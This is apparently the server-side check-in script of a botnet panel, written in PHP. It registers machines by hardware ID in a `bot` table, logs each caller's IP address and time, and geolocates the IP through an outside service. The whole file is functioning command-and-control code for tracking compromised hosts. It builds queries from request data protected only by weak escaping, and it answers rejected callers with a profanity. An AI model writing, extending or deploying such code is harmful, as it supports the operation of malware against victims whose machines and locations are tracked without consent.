<?php
//error_reporting(0);
include("config.php");

			 function safe_id($data){

                $data =  trim($data);
                $data =  strip_tags($data);
                $data =  htmlspecialchars($data);
                $data =  addslashes($data);
                
                return $data;
              }
              
	 $hwid = safe_id($_GET['hwid']);
     $d = date('Y/m/d h:i:s a', time());
    // $action = $_GET['act'];
	//$id_q = safe_id($hwid);
	 
	 $sql_std = "SELECT * FROM `bot` where HWID='$hwid'";
	 $query_std = mysqli_query($condb,$sql_std);
	 $count_std = mysqli_num_rows($query_std);
	 
	 if(isset($hwid)){
	     
	     	
	     
	     
		 if($count_std == 0){
			 echo $count_std;
	 		$loc = json_decode(file_get_contents('http://ip-api.com/json/'.$_SERVER['REMOTE_ADDR']), true);
			$c = $loc['countryCode'];
			 

	
	
					if (!preg_match("/^[-a-zA-Z-0-9]*$/",$hwid)) {
						
						  echo  "Go Fuck yourself :v ";
						  
						  // exit();
						   
						}else{

							//echo  "allowed :)";
						 mysqli_query($condb,"INSERT INTO `bot` SET `IP`='".$_SERVER['REMOTE_ADDR']."', `HWID`='$hwid', `Date_Time`='$d', `Country`='$c'");
						 //mysql_query("DELETE FROM `bot` WHERE `HWID`=''"); //clear shit :v 
		
					}
			

				
		 }else{
			 
			mysqli_query($condb,"UPDATE `bot` SET `Date_Time`='$d',`IP`='".$_SERVER['REMOTE_ADDR']."' WHERE `HWID`='$hwid'"); 
			 
		 }
	 }

	 
?>